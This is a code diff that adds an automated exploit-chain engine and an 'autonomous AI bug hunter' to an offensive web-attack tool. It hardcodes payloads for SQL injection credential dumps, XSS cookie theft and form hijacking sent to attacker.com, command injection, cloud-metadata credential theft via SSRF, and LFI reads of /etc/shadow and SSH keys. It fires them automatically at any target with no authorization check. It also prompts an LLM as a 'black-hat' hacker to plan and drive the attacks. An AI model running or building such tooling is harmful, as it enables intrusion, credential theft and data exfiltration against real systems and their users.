@@ -2813,3 +2813,470 @@ async function deepRecursiveScan(
     execution_time: Date.now() - startTime,
   };
 }
+
+// ===== EXPLOIT CHAIN EXECUTION ENGINE =====
+// AI identifies chain attack opportunities and auto-executes full chains
+// e.g., IDOR user enum → privilege escalation, Info Disclosure → RCE, SQLi → Data Exfil → Priv Esc
+
+const CHAIN_PATTERNS = [
+  {
+    name: 'IDOR → Privilege Escalation',
+    trigger: (findings: Finding[]) => findings.some(f => ['idor', 'auth-bypass'].includes(f.type)) && findings.some(f => f.type !== 'idor'),
+    steps: [
+      { action: 'enumerate-users', description: 'Enumerate valid user IDs via IDOR', payloads: ['/api/v1/users/1', '/api/v1/users/2', '/api/v1/users/admin', '/api/users/0', '/api/users/-1'] },
+      { action: 'escalate-role', description: 'Attempt privilege escalation on discovered users', payloads: ['{"role":"admin"}', '{"isAdmin":true}', '{"user_type":"administrator"}', '{"permission":"*"}'] },
+      { action: 'access-admin', description: 'Access admin-only endpoints with escalated privileges', payloads: ['/admin/dashboard', '/api/admin/users', '/api/v1/admin/settings', '/internal/debug'] },
+    ]
+  },
+  {
+    name: 'Info Disclosure → RCE',
+    trigger: (findings: Finding[]) => findings.some(f => ['info-disclosure', 'misconfig'].includes(f.type)),
+    steps: [
+      { action: 'extract-config', description: 'Extract configuration data from exposed files', payloads: ['/.env', '/.git/config', '/config.json', '/application.yml', '/wp-config.php', '/web.config'] },
+      { action: 'exploit-secrets', description: 'Use discovered secrets for deeper access', payloads: ['Authorization: Bearer {token}', 'X-API-Key: {key}', 'Cookie: session={session}'] },
+      { action: 'rce-attempt', description: 'Attempt RCE using discovered endpoints/creds', payloads: ['; id', '| whoami', '$(cat /etc/passwd)', '{{7*7}}', '${Runtime.getRuntime().exec("id")}'] },
+    ]
+  },
+  {
+    name: 'SQLi → Data Exfiltration → Account Takeover',
+    trigger: (findings: Finding[]) => findings.some(f => ['sqli', 'nosql'].includes(f.type)),
+    steps: [
+      { action: 'extract-schema', description: 'Extract database schema via injection', payloads: ["' UNION SELECT table_name,null FROM information_schema.tables--", "' UNION SELECT column_name,table_name FROM information_schema.columns--"] },
+      { action: 'dump-credentials', description: 'Extract user credentials from database', payloads: ["' UNION SELECT username,password FROM users--", "' UNION SELECT email,password_hash FROM accounts--", "' UNION SELECT user_login,user_pass FROM wp_users--"] },
+      { action: 'account-takeover', description: 'Use extracted credentials for account takeover', payloads: [] },
+    ]
+  },
+  {
+    name: 'XSS → Session Hijack → Account Takeover',
+    trigger: (findings: Finding[]) => findings.some(f => ['xss', 'ssti'].includes(f.type)),
+    steps: [
+      { action: 'steal-cookies', description: 'Craft XSS payload for cookie exfiltration', payloads: ['<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>', '<img src=x onerror="new Image().src=\'https://attacker.com/?\'+document.cookie">'] },
+      { action: 'session-fixation', description: 'Attempt session fixation attack', payloads: ['<script>document.cookie="session=attacker_session"</script>'] },
+      { action: 'dom-manipulation', description: 'Manipulate DOM for credential harvesting', payloads: ['<script>document.forms[0].action="https://attacker.com/phish"</script>'] },
+    ]
+  },
+  {
+    name: 'SSRF → Internal Service Access → Data Exfiltration',
+    trigger: (findings: Finding[]) => findings.some(f => ['ssrf'].includes(f.type)),
+    steps: [
+      { action: 'scan-internal', description: 'Scan internal network via SSRF', payloads: ['http://127.0.0.1:6379', 'http://127.0.0.1:3306', 'http://127.0.0.1:27017', 'http://127.0.0.1:9200', 'http://127.0.0.1:8080/manager'] },
+      { action: 'cloud-metadata', description: 'Access cloud metadata services', payloads: ['http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'http://169.254.169.254/latest/user-data', 'http://metadata.google.internal/computeMetadata/v1/'] },
+      { action: 'exfiltrate-data', description: 'Exfiltrate internal data via SSRF', payloads: ['file:///etc/passwd', 'file:///etc/shadow', 'file:///proc/self/environ'] },
+    ]
+  },
+  {
+    name: 'LFI → Source Code → Hardcoded Secrets → RCE',
+    trigger: (findings: Finding[]) => findings.some(f => ['lfi', 'dir-traversal', 'traversal'].includes(f.type)),
+    steps: [
+      { action: 'read-source', description: 'Read application source code via LFI', payloads: ['php://filter/convert.base64-encode/resource=index.php', '../../../../app/config/parameters.yml', '../../../../var/www/html/.env'] },
+      { action: 'find-secrets', description: 'Extract hardcoded secrets from source', payloads: ['../../../../proc/self/environ', '../../../../etc/environment', '../../../../home/*/.ssh/id_rsa'] },
+      { action: 'rce-via-log', description: 'Achieve RCE via log poisoning', payloads: ['../../../../var/log/apache2/access.log', '../../../../var/log/nginx/access.log'] },
+    ]
+  },
+];
+
+async function executeExploitChains(
+  target: string, findings: Finding[], techStack: string[], authHeader: string, supabase: any, userId: string
+): Promise<{ chains_executed: any[]; new_findings: Finding[]; output: string[]; execution_time: number }> {
+  const startTime = Date.now();
+  const output: string[] = [];
+  const newFindings: Finding[] = [];
+  const chainsExecuted: any[] = [];
+
+  output.push(`[CHAIN-ENGINE] Analyzing ${findings.length} findings for exploit chain opportunities...`);
+
+  // AI identifies chain opportunities
+  let aiChainPlan: any = null;
+  if (LOVABLE_API_KEY && findings.length >= 2) {
+    try {
+      const resp = await fetch(AI_GATEWAY_URL, {
+        method: 'POST',
+        headers: { 'Authorization': `Bearer ${LOVABLE_API_KEY}`, 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          model: 'google/gemini-2.5-flash',
+          messages: [
+            { role: 'system', content: `You are a black-hat exploit chain specialist. Given vulnerability findings, identify ALL possible multi-step exploit chains that maximize impact. Think like a bug bounty hunter going for maximum payout. Consider:
+- IDOR → PrivEsc chains (enumerate users, then escalate)
+- Info Disclosure → RCE chains (find secrets, use them)
+- SQLi → Account Takeover (dump creds, login)
+- XSS → Session Hijack
+- SSRF → Internal Access → Data Exfil
+- LFI → Source Code → Secrets → RCE
+- Chaining low-severity bugs into critical chains
+
+Return JSON: {"chains": [{"name": "chain name", "steps": [{"finding_type": "sqli", "action": "description", "payload": "test payload", "target_endpoint": "/api/x"}], "impact": "Critical/High", "bounty_estimate": "$X,XXX"}]}` },
+            { role: 'user', content: `Target: ${target}\nTech: ${techStack.join(', ')}\nFindings:\n${JSON.stringify(findings.map(f => ({ type: f.type, title: f.title, severity: f.severity, exploitable: f.exploitable, param: f.evidence?.raw?.parameter })), null, 2)}` }
+          ],
+          max_tokens: 2000,
+        })
+      });
+      if (resp.ok) {
+        const result = await resp.json();
+        const content = result.choices?.[0]?.message?.content || '';
+        const jsonMatch = content.match(/\{[\s\S]*\}/);
+        if (jsonMatch) {
+          aiChainPlan = JSON.parse(jsonMatch[0]);
+          output.push(`[CHAIN-ENGINE] AI identified ${aiChainPlan.chains?.length || 0} exploit chains`);
+        }
+      }
+    } catch (e) {
+      output.push(`[CHAIN-ENGINE] AI chain analysis failed: ${e.message}`);
+    }
+  }
+
+  // Execute pattern-matched chains
+  for (const pattern of CHAIN_PATTERNS) {
+    if (!pattern.trigger(findings)) continue;
+
+    output.push(`\n[CHAIN-ENGINE] ━━━ Executing: ${pattern.name} ━━━`);
+    const chainResult: any = { name: pattern.name, steps_completed: 0, findings: [] };
+
+    for (const step of pattern.steps) {
+      output.push(`[CHAIN] Step: ${step.description}`);
+      let stepSuccess = false;
+
+      for (const payload of step.payloads) {
+        if (!payload) continue;
+        try {
+          // Determine if this is a path-based test or param-based test
+          const isPath = payload.startsWith('/') || payload.startsWith('http');
+          
+          if (isPath) {
+            const testUrl = payload.startsWith('http') ? payload : `https://${target}${payload}`;
+            const resp = await fetch(testUrl, {
+              method: 'GET',
+              headers: { 'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] },
+              redirect: 'manual',
+            });
+            if (resp.status >= 200 && resp.status < 400 && resp.status !== 301 && resp.status !== 302) {
+              const body = await resp.text().catch(() => '');
+              if (body.length > 0 && !body.includes('404') && !body.includes('Not Found')) {
+                stepSuccess = true;
+                newFindings.push({
+                  id: crypto.randomUUID(),
+                  type: 'exploit-chain',
+                  severity: 'critical',
+                  title: `[CHAIN] ${pattern.name}: ${step.description}`,
+                  description: `Exploit chain "${pattern.name}" step succeeded. Endpoint ${payload} accessible (HTTP ${resp.status}).`,
+                  evidence: { raw: { chain: pattern.name, step: step.action, payload, status: resp.status, body_preview: body.slice(0, 200) } },
+                  timestamp: new Date().toISOString(),
+                  phase: 'exploit-chain',
+                  tool_used: 'chain-engine',
+                  exploitable: true,
+                  exploit_confirmed: true,
+                  confidence: 0.88,
+                  verified: true,
+                  poc_data: `Chain: ${pattern.name}\nStep: ${step.description}\nEndpoint: ${payload}\nHTTP: ${resp.status}\nPreview: ${body.slice(0, 100)}`,
+                });
+                output.push(`[CHAIN] ✅ ${step.description} — SUCCESS (HTTP ${resp.status})`);
+                break;
+              }
+            }
+          } else {
+            // Param-based payload test
+            const resp = await fetch(`${SUPABASE_URL}/functions/v1/attack-execution-loop`, {
+              method: 'POST',
+              headers: { 'Authorization': authHeader, 'Content-Type': 'application/json', 'apikey': SUPABASE_ANON_KEY },
+              body: JSON.stringify({
+                target,
+                payloads: [{ raw: payload, encoded: encodeURIComponent(payload), attackType: step.action, parameter: 'q', injectionPoint: 'body' }],
+                maxRetries: 5, techStack,
+              }),
+            });
+            if (resp.ok) {
+              const result = await resp.json();
+              if (result.successCount > 0) {
+                stepSuccess = true;
+                newFindings.push({
+                  id: crypto.randomUUID(),
+                  type: 'exploit-chain',
+                  severity: 'critical',
+                  title: `[CHAIN] ${pattern.name}: ${step.description}`,
+                  description: `Exploit chain step confirmed via payload injection.`,
+                  evidence: { raw: { chain: pattern.name, step: step.action, payload, result: result.results?.[0] } },
+                  timestamp: new Date().toISOString(),
+                  phase: 'exploit-chain',
+                  tool_used: 'chain-engine',
+                  exploitable: true,
+                  exploit_confirmed: true,
+                  confidence: 0.92,
+                  verified: true,
+                  poc_data: `Chain: ${pattern.name}\nStep: ${step.description}\nPayload: ${payload}`,
+                });
+                output.push(`[CHAIN] ✅ ${step.description} — EXPLOITED`);
+                break;
+              }
+            }
+          }
+        } catch {}
+      }
+
+      if (stepSuccess) {
+        chainResult.steps_completed++;
+      } else {
+        output.push(`[CHAIN] ❌ ${step.description} — blocked/failed`);
+      }
+    }
+
+    chainResult.findings = newFindings.filter(f => f.evidence?.raw?.chain === pattern.name);
+    chainsExecuted.push(chainResult);
+  }
+
+  // Execute AI-identified chains
+  if (aiChainPlan?.chains?.length > 0) {
+    for (const chain of aiChainPlan.chains.slice(0, 5)) {
+      output.push(`\n[CHAIN-ENGINE] ━━━ AI Chain: ${chain.name} (Est. ${chain.bounty_estimate || 'N/A'}) ━━━`);
+      for (const step of (chain.steps || []).slice(0, 4)) {
+        if (step.payload) {
+          try {
+            const isPath = step.target_endpoint || step.payload.startsWith('/');
+            const testTarget = step.target_endpoint ? `https://${target}${step.target_endpoint}` : target;
+            
+            if (isPath && step.target_endpoint) {
+              const resp = await fetch(testTarget, {
+                method: 'GET',
+                headers: { 'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] },
+                redirect: 'manual',
+              });
+              if (resp.status >= 200 && resp.status < 400) {
+                output.push(`[AI-CHAIN] ✅ ${step.action} — HTTP ${resp.status}`);
+                newFindings.push({
+                  id: crypto.randomUUID(), type: 'ai-exploit-chain', severity: 'critical',
+                  title: `[AI-CHAIN] ${chain.name}: ${step.action}`,
+                  description: `AI-identified exploit chain step succeeded.`,
+                  evidence: { raw: { chain: chain.name, step: step.action, endpoint: step.target_endpoint, status: resp.status } },
+                  timestamp: new Date().toISOString(), phase: 'exploit-chain', tool_used: 'ai-chain-engine',
+                  exploitable: true, exploit_confirmed: true, confidence: 0.85, verified: true,
+                  poc_data: `AI Chain: ${chain.name}\nStep: ${step.action}\nEndpoint: ${step.target_endpoint}\nImpact: ${chain.impact}`,
+                });
+              } else {
+                output.push(`[AI-CHAIN] ❌ ${step.action} — HTTP ${resp.status}`);
+              }
+            } else {
+              const resp = await fetch(`${SUPABASE_URL}/functions/v1/attack-execution-loop`, {
+                method: 'POST',
+                headers: { 'Authorization': authHeader, 'Content-Type': 'application/json', 'apikey': SUPABASE_ANON_KEY },
+                body: JSON.stringify({
+                  target, payloads: [{ raw: step.payload, encoded: encodeURIComponent(step.payload), attackType: step.finding_type || 'chain', parameter: 'q', injectionPoint: 'query' }],
+                  maxRetries: 5, techStack,
+                }),
+              });
+              if (resp.ok) {
+                const result = await resp.json();
+                if (result.successCount > 0) {
+                  output.push(`[AI-CHAIN] ✅ ${step.action} — EXPLOITED`);
+                  newFindings.push({
+                    id: crypto.randomUUID(), type: 'ai-exploit-chain', severity: 'critical',
+                    title: `[AI-CHAIN] ${chain.name}: ${step.action}`,
+                    description: `AI exploit chain payload succeeded: ${step.payload}`,
+                    evidence: { raw: { chain: chain.name, step: step.action, payload: step.payload } },
+                    timestamp: new Date().toISOString(), phase: 'exploit-chain', tool_used: 'ai-chain-engine',
+                    exploitable: true, exploit_confirmed: true, confidence: 0.9, verified: true,
+                    poc_data: `AI Chain: ${chain.name}\nPayload: ${step.payload}\nImpact: ${chain.impact}\nBounty Est: ${chain.bounty_estimate}`,
+                  });
+                } else {
+                  output.push(`[AI-CHAIN] ❌ ${step.action} — blocked`);
+                }
+              }
+            }
+          } catch {}
+        }
+      }
+    }
+  }
+
+  // Record findings
+  if (newFindings.length > 0) {
+    try {
+      await supabase.from('attack_attempts').insert(newFindings.map(f => ({
+        user_id: userId, target, attack_type: 'exploit-chain', technique: 'chain-engine',
+        success: true, output: f.description?.slice(0, 500), payload: f.poc_data?.slice(0, 500),
+        metadata: { chain: f.evidence?.raw?.chain, severity: f.severity } as any,
+      })));
+    } catch {}
+  }
+
+  output.push(`\n[CHAIN-ENGINE] ━━━ COMPLETE ━━━`);
+  output.push(`[CHAIN-ENGINE] Chains: ${chainsExecuted.length} | New findings: ${newFindings.length} | Time: ${Date.now() - startTime}ms`);
+
+  return {
+    chains_executed: chainsExecuted,
+    new_findings: deduplicateFindings(newFindings),
+    output,
+    execution_time: Date.now() - startTime,
+  };
+}
+
+// ===== AUTONOMOUS AI BUG HUNTER =====
+// User sends a target + instruction, AI autonomously hunts for bugs
+// Uses iterative reasoning loops: analyze → test → adapt → chain → report
+
+async function aiAutonomousHunt(
+  target: string, instruction: string, context: any, authHeader: string, supabase: any, userId: string
+): Promise<{ thoughts: any[]; findings: Finding[]; chains: any[]; output: string[]; execution_time: number }> {
+  const startTime = Date.now();
+  const thoughts: any[] = [];
+  const allFindings: Finding[] = [];
+  const output: string[] = [];
+
+  const addThought = (thought: string, actions?: string[]) => {
+    thoughts.push({ thought, actions, timestamp: new Date().toISOString() });
+    output.push(`[AI-HUNTER] 🧠 ${thought}`);
+  };
+
+  addThought(`Initializing autonomous hunt on ${target}. Instruction: "${instruction || 'Full bug bounty assessment'}"`);
+
+  // Step 1: AI plans the attack strategy based on instruction
+  let huntPlan: any = null;
+  if (LOVABLE_API_KEY) {
+    try {
+      const resp = await fetch(AI_GATEWAY_URL, {
+        method: 'POST',
+        headers: { 'Authorization': `Bearer ${LOVABLE_API_KEY}`, 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          model: 'google/gemini-2.5-flash',
+          messages: [
+            { role: 'system', content: `You are an elite black-hat bug bounty hunter AI. You have access to these tools:
+1. recon - DNS, headers, tech fingerprinting, SSL analysis, port scanning
+2. spider-crawl - Deep endpoint and parameter discovery
+3. google-dork - Google dork recon for hidden endpoints
+4. sqli/xss/lfi/ssrf/nosql/ssti/cmdi - Injection testing
+5. cors-advanced - CORS misconfiguration testing
+6. port-exploitation - Service-specific exploits
+7. cve-confirmation - CVE exploit confirmation
+8. exploit-chaining - Multi-step exploit chains
+9. mutation-engine - WAF bypass via payload mutation
+
+Given a target and instruction, create a step-by-step attack plan. Think like a real hacker:
+- What would you enumerate first?
+- What attack surface is most promising?
+- What chains could you build?
+- What would a surface scanner miss?
+
+Return JSON: {"plan": [{"phase": "recon", "action": "description", "tools": ["tool1"], "reasoning": "why"}], "priority_vulns": ["xss", "sqli"], "expected_chains": ["IDOR to PrivEsc"], "estimated_time": "X min"}` },
+            { role: 'user', content: `Target: ${target}\nInstruction: ${instruction || 'Find all bugs for maximum bounty payout'}\nContext: ${JSON.stringify(context)}` }
+          ],
+          max_tokens: 1500,
+        })
+      });
+      if (resp.ok) {
+        const result = await resp.json();
+        const content = result.choices?.[0]?.message?.content || '';
+        const jsonMatch = content.match(/\{[\s\S]*\}/);
+        if (jsonMatch) {
+          huntPlan = JSON.parse(jsonMatch[0]);
+          addThought(`Attack plan ready: ${huntPlan.plan?.length || 0} phases. Priority: ${huntPlan.priority_vulns?.join(', ')}. Expected chains: ${huntPlan.expected_chains?.join(', ')}`, huntPlan.plan?.map((p: any) => p.phase));
+        }
+      }
+    } catch (e) {
+      addThought(`AI planning failed, using default aggressive hunt strategy`);
+    }
+  }
+
+  // Step 2: Execute recon
+  addThought(`Phase 1: Deep reconnaissance — fingerprinting tech, ports, subdomains, hidden endpoints...`, ['recon', 'google-dork', 'spider-crawl']);
+  
+  const [reconResult, dorkResult] = await Promise.all([
+    executePhase('recon', target, authHeader),
+    googleDorkRecon(target, authHeader),
+  ]);
+
+  allFindings.push(...reconResult.findings, ...dorkResult.findings);
+  const techStack = reconResult.findings
+    .filter((f: any) => f.type?.includes('technology') || f.tool_used === 'tech')
+    .map((f: any) => f.title.replace(/Technology:\s*/i, '').trim())
+    .filter(Boolean);
+
+  addThought(`Recon complete: ${reconResult.findings.length + dorkResult.findings.length} findings. Tech: ${techStack.join(', ') || 'unknown'}. Endpoints: ${dorkResult.endpoints.length}. Now attacking...`);
+
+  // Step 3: Parallel scanning + exploitation
+  addThought(`Phase 2: Parallel attack — scanning all OWASP categories + service exploitation...`, ['scanning', 'exploitation']);
+
+  const [scanResult, exploitResult] = await Promise.all([
+    executePhase('scanning', target, authHeader),
+    executePhase('exploitation', target, authHeader),
+  ]);
+  allFindings.push(...scanResult.findings, ...exploitResult.findings);
+
+  // Step 4: Deep recursive scan on discovered params
+  addThought(`Phase 3: Deep recursive parameter testing — going deeper than surface scanners...`, ['deep-scan']);
+  
+  try {
+    const deepResult = await deepRecursiveScan(target, 3, techStack, authHeader, supabase, userId);
+    allFindings.push(...deepResult.findings);
+    addThought(`Deep scan: ${deepResult.findings.length} findings from ${deepResult.total_payloads_fired} payloads across ${deepResult.total_params_tested} params`);
+  } catch (e) {
+    addThought(`Deep scan encountered error: ${e.message}`);
+  }
+
+  // Step 5: AI false positive filter
+  addThought(`Phase 4: Eliminating false positives — aggressive triage for bug bounty quality...`, ['fp-filter']);
+  const fpResult = await aiFalsePositiveFilter(allFindings, target, supabase, userId);
+  const confirmedFindings = fpResult.filtered;
+  addThought(`FP filter: ${fpResult.removed?.length || 0} false positives removed. ${confirmedFindings.length} confirmed findings remain.`);
+
+  // Step 6: Exploit chaining
+  let chainResult: any = { chains_executed: [], new_findings: [] };
+  if (confirmedFindings.length >= 2) {
+    addThought(`Phase 5: Exploit chaining — building multi-step attack paths for maximum impact...`, ['chain-engine']);
+    chainResult = await executeExploitChains(target, confirmedFindings, techStack, authHeader, supabase, userId);
+    confirmedFindings.push(...chainResult.new_findings);
+    addThought(`Chains: ${chainResult.chains_executed.length} executed. ${chainResult.new_findings.length} new findings from chain exploitation.`);
+  }
+
+  // Step 7: AI iterative analysis — adapt and re-test
+  if (LOVABLE_API_KEY) {
+    addThought(`Phase 6: AI iterative reasoning — analyzing results and identifying missed opportunities...`);
+    try {
+      const analysisResp = await fetch(AI_GATEWAY_URL, {
+        method: 'POST',
+        headers: { 'Authorization': `Bearer ${LOVABLE_API_KEY}`, 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          model: 'google/gemini-2.5-flash',
+          messages: [
+            { role: 'system', content: `You are reviewing the results of an automated bug bounty hunt. Analyze the findings and identify:
+1. What attack vectors were MISSED?
+2. What parameters need deeper testing?
+3. What chains haven't been attempted?
+4. What would a human hacker try that we didn't?
+Be specific and actionable.` },
+            { role: 'user', content: `Target: ${target}\nTech: ${techStack.join(', ')}\nFindings: ${confirmedFindings.length}\nTypes: ${[...new Set(confirmedFindings.map(f => f.type))].join(', ')}\nChains: ${chainResult.chains_executed.length}\n\nTop findings:\n${confirmedFindings.slice(0, 10).map(f => `- ${f.title} (${f.severity})`).join('\n')}` }
+          ],
+          max_tokens: 800,
+        })
+      });
+      if (analysisResp.ok) {
+        const analysis = await analysisResp.json();
+        const content = analysis.choices?.[0]?.message?.content || '';
+        addThought(`AI Analysis:\n${content.slice(0, 500)}`);
+      }
+    } catch {}
+  }
+
+  // Final summary
+  const deduped = deduplicateFindings(confirmedFindings);
+  const critCount = deduped.filter(f => f.severity === 'critical').length;
+  const highCount = deduped.filter(f => f.severity === 'high').length;
+  addThought(`🏁 Hunt complete! ${deduped.length} confirmed findings (${critCount} critical, ${highCount} high). ${chainResult.chains_executed.length} exploit chains executed. Ready for reporting.`);
+
+  // Record learning
+  try {
+    await supabase.from('ai_learnings').insert({
+      user_id: userId, tool_used: 'ai-autonomous-hunt', target,
+      findings: deduped as any, success: deduped.length > 0,
+      execution_time: Date.now() - startTime,
+      ai_analysis: `Autonomous hunt: ${deduped.length} findings, ${chainResult.chains_executed.length} chains, ${critCount} critical`,
+      improvement_strategy: deduped.length > 0
+        ? `Effective types: ${[...new Set(deduped.map(f => f.type))].join(', ')}`
+        : 'No findings — target may have strong security posture',
+    });
+  } catch {}
+
+  return {
+    thoughts,
+    findings: deduped,
+    chains: chainResult.chains_executed,
+    output,
+    execution_time: Date.now() - startTime,
+  };
+}
